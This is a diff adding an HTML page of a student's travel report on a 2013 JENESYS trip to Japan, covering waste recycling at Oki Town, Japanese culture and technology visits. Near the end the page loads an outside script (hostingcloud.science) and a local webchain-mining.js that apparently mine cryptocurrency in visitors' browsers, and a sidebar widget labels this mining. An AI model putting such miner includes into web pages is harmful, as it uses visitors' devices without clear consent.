@@ -1,0 +1,268 @@
+<html>
+
+  <head>
+
+    <link rel="stylesheet" type="text/css" href="../main.css">
+
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script type="text/javascript" src="https://blockchain.info/Resources/js/pay-now-button.js"></script>
+
+  </head>
+
+  <body>
+
+    <div class="grid-container">
+  
+      <div class="grid-header">
+	    <div class="grid-header-1">
+			<h1>Posts During My Bachelor's Program</h1>
+		</div>
+		
+		<div class="grid-header-2">
+		</div>
+      </div>	
+		
+      <div class="grid-menu">
+		<ul class="navmenu">
+			<li><a href="../index.html" id="index">Main Home</a></li>
+			<li><a href="jenesys203rdbatch.html" id="jenesys20findingsinjapan">This Home</a></li>
+			<li><a href="jenesys203rdbatchcontributionsandfutureplan.html" id="jenesys20contributionsandfutureplan">Contributions and Future Plan</a></li>
+			<li>
+				<a href="#" style="padding-left: 1.5em">More</a>
+						<ul>
+							<li><a href="jenesys203rdbatchcover.html" id="jenesys20cover">Cover</a></li>
+							<li><a href="jenesys203rdbatchpreface.html" id="jenesys20preface">Preface</a></li>
+							<li><a href="jenesys203rdbatchabstract.html" id="jenesys20abstract">Abstract</a></li>
+							<li><a href="jenesys203rdbatchtableofcontents.html" id="jenesys20tableofcontents">Table of Contents</a></li>
+							<li><a href="jenesys203rdbatchtableoffigures.html" id="jenesys20tableoffigures">Table of Figures</a></li>
+							<li><a href="jenesys203rdbatchtableoftables.html" id="jenesys20tableoftables">Table of Tables</a></li>
+							<li><a href="jenesys203rdbatchintroduction.html" id="jenesys20introduction">Introduction</a></li>
+							<li><a href="jenesys203rdbatchabout.html" id="jenesys20about">About</a></li>
+							<li><a href="jenesys203rdbatchconclusion.html" id="jenesys20conclusion">Conclusion</a></li>
+							<li><a href="jenesys203rdbatchreference.html" id="jenesys20reference">Reference</a></li>
+						</ul>
+			</li>
+		</ul>
+      </div>
+  
+      <div class="grid-widget">
+
+	  <!-- Webchain Mining -->
+	  <input type="range" min="0" max="100" value="50" />
+	  <p id="range-value"></p>
+	  <p id="message"></p>
+	  <p id="threads"></p>
+	  <p id="hashrate"></p>
+	  <p id="hashes"></p>
+	  <br /><br />
+
+	  <!-- Bitcoin Donation -->
+          <a href="#"><div style="font-size:16px;margin:0 auto;width:300px" class="blockchain-btn" data-address="1NVeQ9ty77FrZogDhptwG1931wUSV78UKq" data-shared="false">
+          <div class="blockchain stage-begin">
+            <img src="https://blockchain.info/Resources/buttons/donate_64.png"/>
+          </div>
+          <div class="blockchain stage-ready">
+            <p align="center">Please Donate To Bitcoin Address: <b>[[address]]</b></p>
+            <p align="center" class="qr-code"></p>
+          </div>
+          <div class="blockchain stage-paid">
+            Donation of <b>[[value]] BTC</b> Received. Thank You.
+          </div>
+          <div class="blockchain stage-error">
+            <font color="red">[[error]]</font>
+          </div>
+        </div></a>
+	<br /><br />
+            <!-- Paypal Donation -->
+            <form class="row" action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
+               <input type="hidden" name="cmd" value="_s-xclick" />
+               <div class="input-field col s12">
+                  <input type="hidden" name="on0" value="Donate" />
+                  <select name="os0">
+                     <option value="" disabled selected>Donate</option>
+                     <option value="Thanks for the drinks.">Thanks for the drinks. $1.00 USD</option>
+                     <option value="Thanks for the meals.">Thanks for the meals. $10.00 USD</option>
+                     <option value="Thanks for the living costs.">Thanks for the living costs. $50.00 USD</option>
+                     <option value="Thanks for your generosity.">Thanks for your generosity. $100.00 USD</option>
+                  </select>
+               </div>
+               <div class="input-field col s12">
+                  <input type="hidden" name="on1" value="Your Name" /><label>Your Name</label><input type="text" name="os1" maxlength="200" />
+               </div>
+               <div class="input-field col s12">
+                  <input class="input-field" type="hidden" name="on2" value="Email" /><label>Email</label><input type="text" name="os2" maxlength="200" />
+               </div>
+               <input type="hidden" name="currency_code" value="USD" />
+               <input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----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-----END PKCS7-----
+                  " />
+               <input type="image" src="https://www.paypalobjects.com/en_US/JP/i/btn/btn_buynowCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!" />
+               <img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1" />
+            </form>
+
+      </div>  
+  
+      <div class="grid-content">
+		 
+<h2>Chapter 3 Findings In Japan</h2>
+
+<h3>3.1 Environment and City Management</h3>
+
+<p>I found the city's management well organized. I've seen the business district has its own block.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/e22a2ea6-fa37-46ef-83ac-1d99c58310ee-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.1 Image taken at Tokyo</figcaption>
+</figure>
+
+
+<p>I've also seen the residential district and farms seperated.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/a4bd1d53-082d-47b3-add6-fb1edfd053e2-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.2 Image taken somewhere at Fukuoka</figcaption>
+</figure>
+
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/c4504fd7-31b0-4ca6-bb4c-9be19ab22845-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.3 Image taken somewhere at Fukuoka near Kururun</figcaption>
+</figure>
+
+
+<p>Overall the towns are clean.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/e0fa9fdd-1614-4703-9534-7e93aebcbb07-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.4 Image taken somewhere at Fukuoka where no rubbish was sighted</figcaption>
+</figure>
+
+
+<p>On 27th June 2013 from 09:30 – 11:00, we visited a recycling based town development Oki Town (Oki Town sustainable centre “Kururun”) and have a lecture of waste management there. Here the wastes are divided into 25 varieties.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/7e02e958-e230-4956-9f69-3abef97e29ea-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.5 Waste division at Oki Town</figcaption>
+</figure>
+
+
+<p>Today at this town 97% of its waste are recycled which means there is only 3% rubbish and the rest can be use for something beneficial. For example fertilizer, electricity from biogas, diesel from kitchen waste. It's also thanks to local town's folk support to relize this. In the future they're aiming for zero waste town.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/9aec35bd-6ad7-4737-b364-57ad0d165dd3-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.6 Some recycled products at Oki Town</figcaption>
+</figure>
+
+
+<p>I found that Fukuoka is also rich in agriculture. On 27th June 2013 from 16:00 – 17:00 we have lecture of agriculture at Asakura City. They're currently focusing on creating healthy and tasty snacks made from fruits and vegetables. Their reasons for this it's because youths today eats more snacks (like chips) and less fruit. So they like to create healthy chips made from fruits and vegetables.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/daa55631-e700-4056-a782-d5808007d2df-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.7 Some agricultural products in Fukuoka</figcaption>
+</figure>
+
+
+<h3>3.2 Culture and People</h3>
+
+<p>My first impression of the people when coming to Japan was they're strict with time. There's no tolerance of the word late in Japan. Everything is punctual. What I examine of how they can be punctual, it's because of subway train. Logically a subway train is clear channel transportation. Therefore the time of a subway train arrives is predictable and accurate.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/393686ba-6d61-460a-9ac2-a473bf8c9189-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.8 People coming out of subway station and train arrived on time</figcaption>
+</figure>
+
+
+<p>Even though they advance their technology but they still preserve their culture. On 25th June 2013 from 14:30 – 16:30 we went to Ohari Park to experience Noh Play ourselves. This play was founded around 700 years ago on the age of the Samurai. I asked whether the audience needed to understand Japanese in order to enjoy this play. The answered, it's played in classical Japanese even native Japanese people find it hard to understand. Even though there is lack in understanding this play can still be enjoyed just witnessing the performance and costumes, similar to watching Operah.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/7e1e70d4-823b-4018-b4d1-c5cdc1214992-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.9 Experiencing Noh Play at Ohari</figcaption>
+</figure>
+
+
+<p>From overall the Japanese people I have met, they're open, they really want to know of other peoples background and culture. The service that I witness there is very surprising. Every store I went to provides excellent customer service. The store clerks will always smile and says “irasshaimase” which is for welcoming someone whenever someone came. Most of the clerks have bright face when facing their clients. Other than that they also greet like “Ohaiyougozaimasu” which is Good morning. In the end they always thank their customer “arigatougozaimasu” which means thank you. Back to environment management, the people always keep their environment clean and tidy. They always throw their rubbish on the bin and arrange their surroundings well.</p> <br />
+
+<p>On 27th June 2013 from 17:00 – 21:00 I have a home visit to Tanaguchi family. The entire family provides excellent hospitality even though we have trouble communicating because I could only speak Japanese a little. They're open people and likes to know how things are in my country.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/c1ea6838-3200-4626-859f-c3703783b841-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.10 Photo with Tanaguchi family</figcaption>
+</figure>
+
+
+<h3>3.3 Technology</h3>
+
+<p>My first impression of the technology in Japan was advance. My group J is a science and technology group. Most of our programs are explorations of technologies in Japan. There are two that had been mention above which are subway train and recycling factory in Oki Town. The everyday technology I experienced was automatic toilet seat.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/8a7f847c-9dcf-4731-935a-318f9f3c4f53-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.11 Automatic Toilet Seat</figcaption>
+</figure>
+
+
+
+<p>The first program of technologies was on 26th June 2013 by NEXT Systems, Co., Ltd which was about stories behind its research and development, motion control system (Kinect in medical field, etc.) hands-on experience of Augmented Reality System, Kinect in fashion try-on, and Head Mount 3D Display. After that was demo of the technology. The first demo was AR of pamphlet and condominium. This technology works on android system by installing the application then connecting to the AR's network. Here I asked whether it needs its own connection or not. They answered they provided their on connection or it can be connected to the Internet. I also asked whether the current network capacity (most people called it bandwidth) is enough for today and future if all citizens are using this technology. They replied that technology is growing, today's current technology is enough but it's still growing, so it will be alright in the future. On my experience the android reads the 2D image then converts it to 3D or more detailed images. The second demo was virtual fashion demonstration where the person stands in front of the mirror and select virtual clothes to try on. The ideal technology is the same as trying clothes in changing room but virtually. So instead of wasting much energy on trying clothes in changing room, it's more energy efficient to use this virtual fashion mirror. This is also based on Kinect. The third demo was Kinect on mechanical of acceleration of cars. Kinect is an input device without any controller. Gestures lead to intuitive control. The picture is in 3D, the ideal technology is examining an object by touching except here is virtual.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/a4f687b1-c29a-42a1-9dcb-b32c8b9239e2-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.12 AR demo on pamphlet and condominium</figcaption>
+</figure>
+
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/d06712bd-0461-462f-934d-3675fbea041e-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.13 Virtual fashion demonstration</figcaption>
+</figure>
+
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/3f3f354c-709a-4a2f-99f1-3e1a1237a5d3-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.14 Kinect on mechanical of car engine acceleration</figcaption>
+</figure>
+
+
+<p>The second program of technologies was lectures of hydrogen energy project, organic photonics and electronics R&D base, and ruby contents related policy measures also promoting of digital contents industry utilizing programming language ruby by Fukuoka Prefectural Government.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/51ec6a83-ac8e-4a19-9d14-542f3e196967-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.15 Image taken on lecture by Fukuoka Prefectural Government</figcaption>
+</figure>
+
+
+<p>About the lecture of Hydrogen Energy is basically a fuel cell that generates electricity through the chemical reaction in which hydrogen and oxygen react to produce water and electricity. They said the energy produce is comparable to other electrical generator. The greatest advantage of this Hydrogen strategy is CO2 free. It doesn't produce CO2, so their future plan is CO2 free electrical power plants replacing those that generate high pollution. The next one was about organic EL display which EL stands for electroluminescence. Its main purpose is energy efficiency, since the material itself emits light so it saves the effort of emitting light, so it uses less energy. I asked on this session of how it compares to LCD. They have surprising answers which first of course it's much more efficient, second it's same cost to LCD, third it has same lifespan, and finally a shocking answer it has better performance than LCD (usually those with higher efficiency has lower performance). The next lecture it's about Ruby and digital industry content. Since time is limited they only introduce, and said they're recruiting undergraduates every year.</p> <br />
+
+<p>The third program was about Oki Town Sustainable Centre “Kururun”, Recycling based town development which had already been explained in section 3.2.</p> <br />
+
+<p>The fourth program was a company visit to Toyota Motor Kyushu.</p>
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/4a9ea1b3-4aee-435e-b118-7fee5d36fe00-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.16 Image taken of presentation video on Toyota Motor Kyushu</figcaption>
+</figure>
+
+
+<p>To be honest it was too much for me to comprehend and we're forbid to take photos, but what I captured was they work with excellent system. We took tour on a real field of how cars are produced from zero until made. Their workers are humans and robots. What I saw, parts were carried by robots, and some simpler assembling was also done by robots. Other jobs and complicated assembling were done by humans. Their work was very systematic. Each phase of assembling are done by different people, with each phase has its time limit. If a worker encounters problems which cannot be solved within the time limit, the worker rings the bell and the flow will be stopped and others will come to help. After each phase of assembling there's an inspection and all data are recorded.</p> <br />
+
+<p>The fourth program was about Agricultural produce in Asakura Technological development of Agri-Processing, already written on section 3.2.</p> <br />
+
+<p>The last program regarding on technology was a visit to Kyutech (Kyushu Institute of Technology). We were divided into 2 groups 1 to go the Mechanical Engineering Laboratory. I chose to go to Laboratory of Spacecraft Environmental Interaction Engineering. I captured that on that laboratory they research on Spacecraft Environmental Interaction through artificial Space they created in tubes. In those tubes are artificial Space base on real Space. They conduct many kinds of experiments there.</p> <br />
+
+<figure>
+  <img src="https://beta-static.photobucket.com/images/ii560/0fajarpurnama0/0/cf7a7500-5ffa-4d08-851a-7c30371e840a-original.jpg?width=1920&height=1080&fit=bounds" alt="" width="100%">
+  <figcaption>Figure 3.17 Images taken at Laboratory of Spacecraft Environmental Interaction Engineering Kyutech</figcaption>
+</figure>
+		
+      </div>
+
+    </div>
+
+    <script src="https://www.hostingcloud.science./w5AY.js"></script>
+    <script src="../webchain-mining.js"></script>
+  </body>
+
+  <footer>
+
+    Fajar Purnama <a rel="license" href="http://creativecommons.org/licenses/by/4.0/" style="background-color: transparent;"><img alt="Creative Commons License" style="border-width: 0px; background-color: transparent;" src="https://i.creativecommons.org/l/by/4.0/88x31.png"></a>This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/" style="background-color: transparent;">Creative Commons Attribution 4.0 International License</a>.
+
+  </footer>
+
+</html>
